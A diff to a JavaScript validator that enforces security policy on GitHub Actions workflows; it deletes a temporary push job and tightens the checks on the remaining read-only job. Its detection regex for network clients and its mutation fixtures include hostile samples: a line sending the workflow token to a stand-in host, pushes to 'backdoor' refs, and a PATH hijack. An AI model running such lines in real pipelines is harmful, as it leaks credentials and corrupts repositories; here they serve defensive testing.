@@ -144,16 +144,6 @@ const REVIEWED_PARSER = Object.freeze({
 // rather than a sample of it. Deliberately no /g flag: this is reused with test().
 const NETWORK_CLIENT = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|Start-BitsTransfer|Net\.WebClient|WebClient|HttpClient|WebRequest|TcpClient|UdpClient|HttpListener|Socket)\b|System\.Net\./iu;
 
-// The push step is the only place a contents-write token is used, and three
-// successive rounds showed that pattern-matching its script is not winnable:
-// each targeted check was evaded by a more indirect construction — a different
-// ref namespace, then a direct "git ... push", then invoking Git through the
-// resolved .Source path with the ref assembled from concatenated fragments.
-// Enumerating bad forms in a script that can compute anything is the wrong
-// shape of defence, so the reviewed script is pinned exactly. The cost is low
-// precisely because this step is temporary and frozen: T1B deletes it, and any
-// intentional edit before then is expected to update this digest deliberately.
-const REVIEWED_PUSH_STEP_DIGEST = 'a06736b81cac51f56b93eb77477cbab4504fed961f4acfa9a04ad79af679cde7';
 
 // The Markdown validation step captures each phase status into a variable and
 // defers the failure decision to a final check. The structural assertions below
@@ -355,7 +345,7 @@ export function validateBuildPolicy(workflow, source) {
   if (workflow.name !== 'Build Style Guide Artifacts') reject('policy', 'build workflow name is not locked');
   assertEqual(workflow.on, EXPECTED_TRIGGER, 'build triggers');
   assertEqual(workflow.permissions, { contents: 'read' }, 'build workflow permissions');
-  assertKeys(workflow.jobs, ['verify', 'temporary-writer'], 'build jobs');
+  assertKeys(workflow.jobs, ['verify'], 'build jobs');
 
   const verify = workflow.jobs.verify;
   assertKeys(verify, ['runs-on', 'permissions', 'steps'], 'build.verify');
@@ -376,233 +366,69 @@ export function validateBuildPolicy(workflow, source) {
     '${{ success() }}',
   );
 
-  const writer = workflow.jobs['temporary-writer'];
-  assertKeys(writer, ['needs', 'if', 'runs-on', 'permissions', 'steps'], 'build.temporary-writer');
-  assertEqual(writer.needs, ['verify'], 'build.temporary-writer needs');
-  if (writer.if !== "${{ github.event_name == 'push' && github.ref == 'refs/heads/main' && needs.verify.result == 'success' }}") {
-    reject('condition-policy', 'temporary writer eligibility changed');
-  }
-  if (writer['runs-on'] !== 'ubuntu-latest') reject('policy', 'temporary writer runner changed');
-  assertEqual(writer.permissions, { contents: 'write' }, 'temporary writer permissions');
-  const writerIds = writer.steps.map((step) => step?.id);
-  assertEqual(writerIds, ['checkout', 'verify-checkout-credentials', 'prepare-generated-commit', 'push-generated'], 'temporary writer step order');
-  assertActionStep(findStep(writer, 'checkout', 'build.temporary-writer'), 'build.writer.checkout', ACTIONS.checkout, CHECKOUT_INPUTS);
-  validateCredentialCleanupStep(
-    findStep(writer, 'verify-checkout-credentials', 'build.temporary-writer'),
-    'build.temporary-writer.verify-checkout-credentials',
-  );
-
-  const pushStep = findStep(writer, 'push-generated', 'build.temporary-writer');
-  assertKeys(pushStep, ['name', 'id', 'shell', 'env', 'run'], 'build.writer.push-generated');
-  assertEqual(pushStep.env, {
-    STYLE_GUIDE_PUSH_TOKEN: '${{ github.token }}',
-    STYLE_GUIDE_TRIGGER_SHA: '${{ github.sha }}',
-  }, 'build.writer.push-generated.env');
-  if (!pushStep.run.includes("ArgumentList.Add('push')") ||
-      !pushStep.run.includes('GIT_CONFIG_COUNT') ||
-      !pushStep.run.includes('GIT_CONFIG_KEY_0') ||
-      !pushStep.run.includes('GIT_CONFIG_VALUE_0') ||
-      !pushStep.run.includes('--force-with-lease=refs/heads/main:')) {
-    reject('side-effect-policy', 'temporary writer push containment changed');
-  }
-  // --force-with-lease scopes the lease, not the destination. The destination is
-  // the separate refspec argument, so it must be asserted on its own or a
-  // contents-write token could create an arbitrary branch while main is untouched.
-  if (!pushStep.run.includes("ArgumentList.Add('HEAD:refs/heads/main')")) {
-    reject('side-effect-policy', 'temporary writer push destination is not HEAD:refs/heads/main');
-  }
-  if (!pushStep.run.includes("ArgumentList.Add('--no-verify')")) {
-    reject('side-effect-policy', 'temporary writer push no longer bypasses repository hooks');
-  }
-  // push.followTags turns one approved invocation into a tag write that no
-  // refspec in the argument list names, so the refusal is an argument rather
-  // than a configuration value whose precedence could be argued.
-  if (!pushStep.run.includes("ArgumentList.Add('--no-follow-tags')")) {
-    reject('side-effect-policy', 'temporary writer push can propagate tags implicitly');
-  }
-  // Overriding repository-local configuration key by key is not winnable: a
-  // URL-specific setting outranks a generic one regardless of which file each
-  // came from, and the URL prefix can always be made longer. The configuration
-  // the push runs against is therefore authored rather than inspected.
-  if (!pushStep.run.includes('$strReviewedConfig = ') ||
-      !pushStep.run.includes('[System.IO.File]::WriteAllText(') ||
-      !pushStep.run.includes("[System.IO.Path]::Combine($strGitDirectory, 'config')")) {
-    reject('side-effect-policy', 'temporary writer does not author the configuration the push runs against');
-  }
-  // A fetch refspec in the authored configuration would name refs outside
-  // refs/heads/main, which the ref scan below would then have to permit.
-  // No word boundary before "fetch": in the authored configuration the preceding
-  // character is the "t" of a PowerShell `t escape, so \b would never match.
-  if (/fetch\s*=/u.test(pushStep.run)) {
-    reject('side-effect-policy', 'temporary writer authors a fetch refspec it does not need');
-  }
-  // Every check in this function constrains what the push says. None of them
-  // constrains who is asked to say it. The runner prepends each line written to
-  // $GITHUB_PATH by an earlier step onto PATH for this one, so resolving Git by
-  // name would let a wrapper in a writable directory be handed the authorization
-  // header — with the reviewed arguments, the reviewed refs, and this digest all
-  // still intact. The executable and the child environment are both pinned.
-  if (!pushStep.run.includes("@('/usr/bin/git', '/bin/git')") ||
-      !pushStep.run.includes('$objStartInfo.FileName = $strGitPath')) {
-    reject('side-effect-policy', 'temporary writer does not pin the credentialed Git executable');
-  }
-  if (/Get-Command/u.test(pushStep.run)) {
-    reject('side-effect-policy', 'temporary writer resolves Git through a PATH lookup');
-  }
-  // Clearing is the assertion. A denylist of unsafe variables cannot be complete
-  // — a loader preload, a proxy, an askpass helper, and a Git configuration
-  // override are each sufficient on their own — so the child starts from empty.
-  if (!pushStep.run.includes('$objStartInfo.Environment.Clear()')) {
-    reject('side-effect-policy', 'temporary writer inherits its credentialed environment');
-  }
-  for (const required of ["Environment['PATH']", "Environment['GIT_CONFIG_GLOBAL']", "Environment['GIT_CONFIG_SYSTEM']"]) {
-    if (!pushStep.run.includes(required)) {
-      reject('side-effect-policy', `temporary writer does not pin ${required} for the push`);
-    }
-  }
-  // Repository-local .git/config is the one configuration file the generator can
-  // still write, and no GIT_CONFIG_GLOBAL or GIT_CONFIG_SYSTEM value suppresses
-  // it. get-url reports fetch URLs, so a validated origin says nothing about
-  // where a push goes once remote.origin.pushurl exists.
-  if (!pushStep.run.includes('remote get-url --push --all origin') ||
-      !pushStep.run.includes('push-policy: origin push URL is not one credential-free GitHub HTTPS URL')) {
-    reject('side-effect-policy', 'temporary writer does not validate the URL the push will contact');
-  }
-  // A transport allowlist, not a list of bad settings: ext:: and its siblings run
-  // a program that inherits the authorization header, and url.<base>.insteadOf
-  // can rewrite an already-validated URL into one of them. Restricting the
-  // transport makes that rewrite harmless.
-  for (const [key, value] of [['protocol.allow', 'never'], ['protocol.https.allow', 'always'], ['protocol.ext.allow', 'never'], ['credential.helper', '']]) {
-    const index = pushStep.run.indexOf(`= '${key}'`);
-    if (index < 0 || !pushStep.run.slice(index).includes(`= '${value}'`)) {
-      reject('side-effect-policy', `temporary writer does not pin ${key} for the push`);
-    }
-  }
-  // Every ref namespace, not only refs/heads: a lease on main does not constrain
-  // a push to refs/tags or anywhere else.
-  for (const match of pushStep.run.matchAll(/refs\/([^'":\s]+)/gu)) {
-    if (match[1] !== 'heads/main') {
-      reject('side-effect-policy', 'temporary writer references a ref outside refs/heads/main');
-    }
-  }
-  if ((pushStep.run.match(/ArgumentList\.Add\('push'\)/gu) ?? []).length !== 1) {
-    reject('side-effect-policy', 'temporary writer does not invoke push exactly once');
-  }
-  // This step is exempt from the general second-push check below because it owns
-  // the one approved push. That exemption must not extend to additional push
-  // forms inside the step itself: a direct "git ... push" here reaches the same
-  // remote with the same authorization header, under no lease and in any ref
-  // namespace. Only the read-only subcommands the step needs may be invoked
-  // directly, so any other form — including "git -c ..." — is rejected by name.
-  // The pinned-path variable is now the invocation form, so the allowlist has to
-  // recognise it too; matching only the bare name would make this check vacuous.
-  for (const match of pushStep.run.matchAll(/(?:^|[;{(=])[ \t]*&?[ \t]*(?:git|\$strGitPath)[ \t]+(--?[A-Za-z][A-Za-z-]*|[a-z][a-z-]*)/gmu)) {
-    if (!['rev-parse', 'remote'].includes(match[1])) {
-      reject('side-effect-policy', `temporary writer invokes an unapproved direct git form: ${match[1]}`);
-    }
-  }
-  // Closing backstop. The assertions above are kept because they name what
-  // changed; this pins everything they do not model — indirect invocation
-  // through a resolved executable path, refs assembled from fragments, or any
-  // other construction a script can express.
-  if (createHash('sha256').update(pushStep.run, 'utf8').digest('hex') !== REVIEWED_PUSH_STEP_DIGEST) {
-    reject('side-effect-policy', 'temporary writer push script does not match its reviewed digest');
-  }
-
   for (const { jobId, id, run, step } of allRunSteps(workflow)) {
     if ('continue-on-error' in step) reject('failure-policy', `${jobId}.${id} sets continue-on-error`);
     if (NETWORK_CLIENT.test(run)) reject('network-policy', `${jobId}.${id} adds a network client`);
     // Scan the whole step, not just run or env values: a credential reaches the
     // script through any step key just as effectively as through script text.
     const serialized = JSON.stringify(step);
-    if (/secrets\./u.test(serialized) || /GITHUB_TOKEN/u.test(serialized)) {
+    if (/secrets\./u.test(serialized) || /GITHUB_TOKEN/u.test(serialized) || /github\.token/iu.test(run)) {
       reject('credential-policy', `${jobId}.${id} expands an unapproved credential`);
     }
-    // github.token is the contents-write credential the writer pushes with. It
-    // is approved in exactly one place: push-generated's asserted env mapping,
-    // from which the script reads it once and immediately clears it. Anywhere
-    // else — including push-generated's own script text — it is unreviewed.
-    if (id === 'push-generated') {
-      if (/github\.token/iu.test(run)) {
-        reject('credential-policy', `${jobId}.${id} inlines the workflow token in its script`);
-      }
-    } else if (/github\.token/iu.test(serialized)) {
-      reject('credential-policy', `${jobId}.${id} references the workflow token outside the approved push step`);
+    // No job in this workflow holds contents: write, so there is no approved
+    // push, commit, or staging path anywhere in it. These are flat refusals
+    // rather than exemptions keyed to a step id.
+    if (/ArgumentList\.Add\(['"]push['"]\)|\bgit\s+push\b/iu.test(run)) {
+      reject('side-effect-policy', `${jobId}.${id} adds a push path to a read-only workflow`);
     }
-    if (id !== 'push-generated' && /ArgumentList\.Add\(['"]push['"]\)|\bgit\s+push\b/iu.test(run)) {
-      reject('side-effect-policy', `${jobId}.${id} adds a second push path`);
-    }
-    if (id !== 'prepare-generated-commit' && /\bgit\s+(?:add|commit)\b/iu.test(run)) {
-      reject('side-effect-policy', `${jobId}.${id} adds an unapproved repository mutation`);
+    if (/\bgit\s+(?:add|commit)\b/iu.test(run)) {
+      reject('side-effect-policy', `${jobId}.${id} adds a repository mutation to a read-only workflow`);
     }
   }
+
+  const generateStep = findStep(verify, 'generate-and-verify', 'build.verify');
   assertScriptStep(
-    findStep(verify, 'generate-and-verify', 'build.verify'),
+    generateStep,
     'build.verify.generate-and-verify',
     "'diff', '--no-ext-diff', '--no-textconv', '--quiet'",
     'verification no longer classifies native git diff status',
   );
-  const prepareStep = findStep(writer, 'prepare-generated-commit', 'build.temporary-writer');
-  assertScriptStep(
-    prepareStep,
-    'build.temporary-writer.prepare-generated-commit',
-    "'ls-files', '--others', '--exclude-standard', '-z'",
-    'writer no longer uses NUL-delimited untracked paths',
-  );
-  // Hooks live under .git, where none of the working-tree path checks can see
-  // them, and pre-commit runs after the index has been proven bounded — it can
-  // stage anything into the commit that is then pushed. Refusing hooks on the
-  // push while allowing them on the commit contains the wrong end of the pair.
-  if (!/&[ \t]+git[ \t]+commit[ \t]+--no-verify\b/u.test(prepareStep.run)) {
-    reject('side-effect-policy', 'writer commit no longer bypasses repository hooks');
+  // The generator is repository-controlled code and every check in this step
+  // runs after it. In-session it could shadow a cmdlet with a function, reassign
+  // a variable in this scope through Set-Variable -Scope 1, or prepend a
+  // directory to PATH -- each of which redirects the checks onto something it
+  // chose. A process boundary removes the class instead of naming its members,
+  // so the invocation form is policy rather than style.
+  if (!generateStep.run.includes('& pwsh -NoProfile -NonInteractive -File ./.github/workflows/Generate-StyleGuideArtifacts.ps1')) {
+    reject('side-effect-policy', 'the generator no longer runs across a process boundary');
   }
-  // Proving the index proves what was offered, not what was recorded. The paths
-  // that travel are the ones in the object, so they are what must be asserted.
-  if (!prepareStep.run.includes("'diff-tree', '--no-commit-id', '--no-renames', '--name-only', '-r', '-z', 'HEAD'") ||
-      !prepareStep.run.includes("$arrCommitted = Assert-AllowedPaths") ||
-      !prepareStep.run.includes('git-paths: committed and working path sets differ')) {
-    reject('side-effect-policy', 'writer does not verify the committed path set');
+  if (/^\s*& \.\/\.github\/workflows\/Generate-StyleGuideArtifacts\.ps1\s*$/mu.test(generateStep.run)) {
+    reject('side-effect-policy', 'the generator is invoked in-session');
   }
-  // A clean working tree is not evidence that nothing happened: a commit built
-  // on the triggering SHA and checked out leaves every status surface empty and
-  // satisfies the push step's parent check. This must be asserted before the
-  // early return, so it holds on the path where no artifact commit is made.
-  if (!prepareStep.run.includes('git-state: the generator moved HEAD') ||
-      prepareStep.run.indexOf('git-state: the generator moved HEAD') > prepareStep.run.indexOf('if ($arrWorking.Count -eq 0) { return }')) {
-    reject('side-effect-policy', 'writer does not assert HEAD is unmoved before returning early');
+  // Git is resolved from a fixed candidate list before the generator runs and
+  // held in a constant. A PATH lookup or Get-Command call placed after the
+  // generator would consult state that code can steer, and an ordinary variable
+  // could be reassigned from the generator's child scope.
+  if (!generateStep.run.includes("@('/usr/bin/git', '/bin/git')") ||
+      !generateStep.run.includes('New-Variable -Name strGitPath -Value $strResolvedGit -Option Constant') ||
+      !generateStep.run.includes('$objStartInfo.FileName = $strGitPath')) {
+    reject('git-policy', 'build.verify does not pin the Git executable before repository code runs');
   }
-  // Anything a step writes to these files is applied by the runner to every
-  // later step, including the one holding the push token, and .NET reads
-  // variables such as DOTNET_STARTUP_HOOKS before that step's first line runs.
-  // Emptiness is the assertion; naming variables would be a list to outgrow.
-  if (!prepareStep.run.includes('$env:GITHUB_ENV, $env:GITHUB_PATH') ||
-      !prepareStep.run.includes('runner-state: the generator wrote to a runner step communication file') ||
-      prepareStep.run.indexOf('runner-state: the generator wrote to a runner step communication file') > prepareStep.run.indexOf('if ($arrWorking.Count -eq 0) { return }')) {
-    reject('side-effect-policy', 'writer does not assert the runner step communication files are empty');
+  if (/Get-Command/u.test(generateStep.run)) {
+    reject('git-policy', 'build.verify resolves Git through a shadowable command lookup');
+  }
+  if (generateStep.run.indexOf('New-Variable -Name strGitPath') > generateStep.run.indexOf('& pwsh -NoProfile')) {
+    reject('git-policy', 'build.verify resolves Git after the generator runs');
   }
   // Redirected stdout and stderr must be drained concurrently. Reading either to
   // completion before the other deadlocks once the child fills the unread pipe,
   // which hangs the step until the Actions timeout instead of failing.
-  if (!pushStep.run.includes('$objProcess.StandardOutput.ReadToEndAsync()') ||
-      !pushStep.run.includes('$objProcess.StandardError.ReadToEndAsync()')) {
-    reject('side-effect-policy', 'temporary writer no longer drains both push streams concurrently');
-  }
-  for (const [jobLabel, job, stepId] of [
-    ['build.verify', verify, 'generate-and-verify'],
-    ['build.temporary-writer', writer, 'prepare-generated-commit'],
-  ]) {
-    const stepRun = findStep(job, stepId, jobLabel).run;
-    if (!stepRun.includes('$objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)') ||
-        !stepRun.includes('$objProcess.StandardError.ReadToEndAsync()')) {
-      reject('git-policy', `${jobLabel}.${stepId} no longer drains both Git streams concurrently`);
-    }
+  if (!generateStep.run.includes('$objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)') ||
+      !generateStep.run.includes('$objProcess.StandardError.ReadToEndAsync()')) {
+    reject('git-policy', 'build.verify no longer drains both Git streams concurrently');
   }
 
-  validateActionMultiset(source, [
-    ACTIONS.checkout,
-    ACTIONS.uploadArtifact,
-    ACTIONS.checkout,
-  ]);
+  validateActionMultiset(source, [ACTIONS.checkout, ACTIONS.uploadArtifact]);
 }
 
 function validateCredentialCleanupStep(step, label) {
@@ -841,6 +667,8 @@ function replaceOnce(source, from, to) {
 }
 
 // Append-only inventory: existing IDs and meanings must never be reused.
+// IDs retired when the temporary writer was deleted are not reissued; gaps in
+// the BUILD sequence are deliberate.
 const FIXTURE_INVENTORY = Object.freeze([
   ['T1-YAML-001', 'duplicate key', 'yaml', 'a: 1\na: 2\n'],
   ['T1-YAML-002', 'directive', 'yaml', '%YAML 1.2\n---\na: 1\n'],
@@ -867,24 +695,17 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-BUILD-010', 'credential persistence', 'build', (source) => replaceOnce(source, '          persist-credentials: false', '          persist-credentials: true')],
   ['T1-BUILD-011', 'workflow write permission', 'build', (source) => replaceOnce(source, 'permissions:\n  contents: read', 'permissions:\n  contents: write')],
   ['T1-BUILD-012', 'verify write permission', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read', '  verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: write')],
-  ['T1-BUILD-013', 'writer read permission', 'build', (source) => replaceOnce(source, '  temporary-writer:\n    needs: [verify]\n', '  temporary-writer:\n    needs: [verify]\n    outputs: {}\n')],
   ['T1-BUILD-014', 'missing verify job', 'build', (source) => replaceOnce(source, '  verify:', '  renamed-verify:')],
   ['T1-BUILD-015', 'extra job', 'build', (source) => `${source}\n  extra:\n    runs-on: ubuntu-latest\n    steps: []\n`],
   ['T1-BUILD-016', 'matrix introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    strategy:\n      matrix: { os: [ubuntu-latest] }\n    runs-on:')],
   ['T1-BUILD-017', 'service introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    services: {}\n    runs-on:')],
   ['T1-BUILD-018', 'remote reusable workflow', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    uses: example/workflows/.github/workflows/x.yml@main\n    runs-on:')],
-  ['T1-BUILD-019', 'needs mutation', 'build', (source) => replaceOnce(source, '    needs: [verify]', '    needs: []')],
-  ['T1-BUILD-020', 'event condition mutation', 'build', (source) => replaceOnce(source, "github.event_name == 'push'", "github.event_name != 'pull_request'")],
-  ['T1-BUILD-021', 'ref condition mutation', 'build', (source) => replaceOnce(source, "github.ref == 'refs/heads/main'", "github.ref != 'refs/heads/dev'")],
-  ['T1-BUILD-022', 'needs-result mutation', 'build', (source) => replaceOnce(source, "needs.verify.result == 'success'", "needs.verify.result != 'failure'")],
-  ['T1-BUILD-023', 'always widening', 'build', (source) => replaceOnce(source, "needs.verify.result == 'success'", 'always()')],
   ['T1-BUILD-024', 'job output introduction', 'build', (source) => replaceOnce(source, '  verify:\n    runs-on:', '  verify:\n    outputs: { changed: value }\n    runs-on:')],
   ['T1-BUILD-025', 'upload condition mutation', 'build', (source) => replaceOnce(source, '        if: ${{ success() }}', '        if: ${{ always() }}')],
   ['T1-BUILD-026', 'upload continuation', 'build', (source) => replaceOnce(source, '        if: ${{ success() }}\n        uses:', '        if: ${{ success() }}\n        continue-on-error: true\n        uses:')],
   ['T1-BUILD-027', 'upload path broadening', 'build', (source) => replaceOnce(source, '            copilot-instructions.md', '            *.md')],
   ['T1-BUILD-028', 'upload overwrite', 'build', (source) => replaceOnce(source, '          overwrite: false', '          overwrite: true')],
   ['T1-BUILD-029', 'upload step order', 'build', (source) => replaceOnce(source, '        id: upload-generated', '        id: early-upload')],
-  ['T1-BUILD-030', 'second push side effect', 'build', (source) => replaceOnce(source, "          & ./.github/workflows/Generate-StyleGuideArtifacts.ps1", "          & git push\n          & ./.github/workflows/Generate-StyleGuideArtifacts.ps1")],
   ['T1-BUILD-031', 'secret expression', 'build', (source) => replaceOnce(source, '${{ github.token }}', '${{ secrets.PAT }}')],
   ['T1-BUILD-032', 'trigger branch mutation', 'build', (source) => replaceOnce(source, '    branches: [main]', '    branches: [dev]')],
   ['T1-BUILD-033', 'extra trigger', 'build', (source) => replaceOnce(source, 'on:\n', 'on:\n  workflow_dispatch:\n')],
@@ -893,30 +714,12 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-BUILD-036', 'credential-helper status normalization removed', 'build', (source) => replaceOnce(source, '          $intHelperExit = $LASTEXITCODE\n          $global:LASTEXITCODE = 0\n', '          $intHelperExit = $LASTEXITCODE\n')],
   ['T1-BUILD-037', 'authorization status normalization removed', 'build', (source) => replaceOnce(source, '          $intAuthorizationExit = $LASTEXITCODE\n          $global:LASTEXITCODE = 0\n', '          $intAuthorizationExit = $LASTEXITCODE\n')],
   ['T1-BUILD-038', 'secret in step env', 'build', (source) => replaceOnce(source, '        id: generate-and-verify\n        shell: pwsh', "        id: generate-and-verify\n        env:\n          TOKEN: '${{ secrets.PAT }}'\n        shell: pwsh")],
-  ['T1-BUILD-039', 'credential env on the writer script step', 'build', (source) => replaceOnce(source, '        id: prepare-generated-commit\n        shell: pwsh\n', '        id: prepare-generated-commit\n        shell: pwsh\n        env:\n          TOKEN: ${{ secrets.PAT }}\n')],
   ['T1-BUILD-040', 'unreviewed key on a script step', 'build', (source) => replaceOnce(source, '        id: generate-and-verify\n        shell: pwsh\n', '        id: generate-and-verify\n        shell: pwsh\n        working-directory: .\n')],
   ['T1-BUILD-041', 'native-command error mapping guard removed', 'build', (source) => replaceOnce(source, '          if (Test-Path Variable:PSNativeCommandUseErrorActionPreference) {\n              $PSNativeCommandUseErrorActionPreference = $false\n          }\n', '')],
-  ['T1-BUILD-044', 'push destination retargeted off main', 'build', (source) => replaceOnce(source, "ArgumentList.Add('HEAD:refs/heads/main')", "ArgumentList.Add('HEAD:refs/heads/backdoor')")],
-  ['T1-BUILD-045', 'second push invocation added', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')\n", "              [void]$objStartInfo.ArgumentList.Add('push')\n              [void]$objStartInfo.ArgumentList.Add('push')\n")],
-  ['T1-BUILD-046', 'alternate network client in a token-bearing step', 'build', (source) => replaceOnce(source, '          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN', '          Invoke-RestMethod -Uri https://example.invalid -Body $env:STYLE_GUIDE_PUSH_TOKEN\n          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN')],
-  ['T1-BUILD-047', 'tag push added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'", '              git -c "http.https://github.com/.extraheader=$strAuthorization" push origin HEAD:refs/tags/backdoor\n              $objStartInfo.Environment[\'GIT_CONFIG_COUNT\'] = \'5\'')],
-  ['T1-BUILD-048', 'direct git push form added to the writer step', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'", "              git push origin --tags\n              $objStartInfo.Environment['GIT_CONFIG_COUNT'] = '5'")],
-  ['T1-BUILD-049', 'sequential push stream reads restored', 'build', (source) => replaceOnce(source, '              $objOutputTask = $objProcess.StandardOutput.ReadToEndAsync()\n              $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n              $strStandardOutput = $objOutputTask.GetAwaiter().GetResult()\n              $strStandardError = $objErrorTask.GetAwaiter().GetResult()\n', '              $strStandardOutput = $objProcess.StandardOutput.ReadToEnd()\n              $strStandardError = $objProcess.StandardError.ReadToEnd()\n')],
   ['T1-BUILD-050', 'sequential Git stream reads restored', 'build', (source) => replaceOnce(source, '                  $objCopyTask = $objProcess.StandardOutput.BaseStream.CopyToAsync($objOutput)\n                  $objErrorTask = $objProcess.StandardError.ReadToEndAsync()\n                  $objCopyTask.GetAwaiter().GetResult()\n                  $strError = $objErrorTask.GetAwaiter().GetResult()\n', '                  $objProcess.StandardOutput.BaseStream.CopyTo($objOutput)\n                  $strError = $objProcess.StandardError.ReadToEnd()\n')],
-  ['T1-BUILD-051', 'indirect Git invocation in the writer', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('push')", `              $strDestination = 'refs/' + 'tags/backdoor'\n              & ($arrGitCommands[0].Source) -c "http.https://github.com/.extraheader=$strAuthorization" push origin "HEAD:$strDestination"\n              [void]$objStartInfo.ArgumentList.Add('push')`)],
-  ['T1-BUILD-052', 'push hook bypass removed', 'build', (source) => replaceOnce(source, "              [void]$objStartInfo.ArgumentList.Add('--no-verify')\n", '')],
   ['T1-BUILD-053', 'credentialed executable resolved through PATH', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $arrGitCommands = @(Get-Command git -CommandType Application -ErrorAction Stop)\n              $objStartInfo.FileName = $arrGitCommands[0].Source\n')],
   ['T1-BUILD-054', 'trusted Git path list widened', 'build', (source) => replaceOnce(source, "@('/usr/bin/git', '/bin/git')", "@($env:RUNNER_TEMP + '/git', '/usr/bin/git')")],
-  ['T1-BUILD-055', 'credentialed environment inherited', 'build', (source) => replaceOnce(source, '              $objStartInfo.Environment.Clear()\n', '')],
-  ['T1-BUILD-056', 'child PATH left inheritable', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['PATH'] = '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'\n", '')],
-  ['T1-BUILD-057', 'global Git configuration re-enabled for the push', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_GLOBAL'] = '/dev/null'\n", '')],
-  // Isolates the PATH-lookup ban: the pinned assignment is left in place, so
-  // only the ban itself can reject this.
   ['T1-BUILD-061', 'PATH lookup reintroduced beside the pinned path', 'build', (source) => replaceOnce(source, '              $objStartInfo.FileName = $strGitPath\n', '              $arrFallback = @(Get-Command git -CommandType Application -ErrorAction SilentlyContinue)\n              $objStartInfo.FileName = $strGitPath\n')],
-  ['T1-BUILD-062', 'system Git configuration re-enabled for the push', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_SYSTEM'] = '/dev/null'\n", '')],
-  ['T1-BUILD-058', 'commit hook bypass removed', 'build', (source) => replaceOnce(source, '          & git commit --no-verify -m', '          & git commit -m')],
-  ['T1-BUILD-059', 'committed path verification removed', 'build', (source) => replaceOnce(source, "          $objCommitted = Invoke-GitRaw @('diff-tree'", "          $objCommitted = Invoke-GitRaw @('rev-parse'")],
-  ['T1-BUILD-060', 'committed path comparison removed', 'build', (source) => replaceOnce(source, "          $arrCommitted = Assert-AllowedPaths (ConvertFrom-NulRecords $objCommitted.Bytes) $arrArtifacts 'committed'\n", '')],
   ['T1-MARKDOWN-001', 'floating Node major', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: '24'")],
   ['T1-MARKDOWN-002', 'latest Node', 'markdown', (source) => replaceOnce(source, "          node-version: '24.18.1'", "          node-version: 'latest'")],
   ['T1-MARKDOWN-003', 'setup cache enabled', 'markdown', (source) => replaceOnce(source, '          package-manager-cache: false', '          package-manager-cache: true')],
@@ -931,7 +734,6 @@ const FIXTURE_INVENTORY = Object.freeze([
   ['T1-MARKDOWN-012', 'reviewed lock hash altered', 'markdown', (source) => replaceOnce(source, "'277F7168AB3A4F1F7A2565DE13191D64B1572E7CB92B67B0972B3242BD4DE062'", "'377F7168AB3A4F1F7A2565DE13191D64B1572E7CB92B67B0972B3242BD4DE062'")],
   ['T1-MARKDOWN-013', 'pre-install supply gate neutralized', 'markdown', (source) => replaceOnce(source, 'if ($strPackageBefore -cne $strReviewedPackageHash -or', 'if ($false -and $strPackageBefore -cne $strReviewedPackageHash -or')],
   ['T1-BUILD-042', 'workflow token referenced outside the approved push step', 'build', (source) => replaceOnce(source, "          $ErrorActionPreference = 'Stop'\n          $arrArtifacts", "          $ErrorActionPreference = 'Stop'\n          $strToken = '${{ github.token }}'\n          $arrArtifacts")],
-  ['T1-BUILD-043', 'workflow token inlined in the push script', 'build', (source) => replaceOnce(source, '          $strToken = $env:STYLE_GUIDE_PUSH_TOKEN', "          $strToken = '${{ github.token }}'")],
   ['T1-MARKDOWN-015', 'early exit before the remaining required phases', 'markdown', (source) => replaceOnce(source, '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n', '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n          exit 0\n')],
   ['T1-MARKDOWN-016', 'required phases reordered', 'markdown', (source) => {
     const strValidator = '          & $strNodePath ./Validate-WorkflowPolicy.mjs ./build.yml ./markdownlint.yml\n';
@@ -954,24 +756,12 @@ const FIXTURE_INVENTORY = Object.freeze([
   }],
   ['T1-GENERATOR-001', 'generator body rewritten under an unchanged version marker', 'generator', (source) => `${source}\nfunction Invoke-Unreviewed { Add-Content -Path $env:GITHUB_PATH -Value '/tmp/hijack' }\n`],
   ['T1-GENERATOR-002', 'generator truncated', 'generator', (source) => source.slice(0, Math.floor(source.length / 2))],
-  ['T1-BUILD-063', 'push URL left unvalidated while only the fetch URL is checked', 'build', (source) => replaceOnce(source, '          $arrPushUrls = @(& $strGitPath remote get-url --push --all origin)\n', '          $arrPushUrls = @(& $strGitPath remote get-url --all origin)\n')],
-  ['T1-BUILD-064', 'transport allowlist removed from the credentialed push', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_KEY_1'] = 'protocol.allow'\n              $objStartInfo.Environment['GIT_CONFIG_VALUE_1'] = 'never'\n", '')],
-  ['T1-BUILD-065', 'command-executing ext transport re-permitted', 'build', (source) => replaceOnce(source, "              $objStartInfo.Environment['GIT_CONFIG_VALUE_3'] = 'never'", "              $objStartInfo.Environment['GIT_CONFIG_VALUE_3'] = 'always'")],
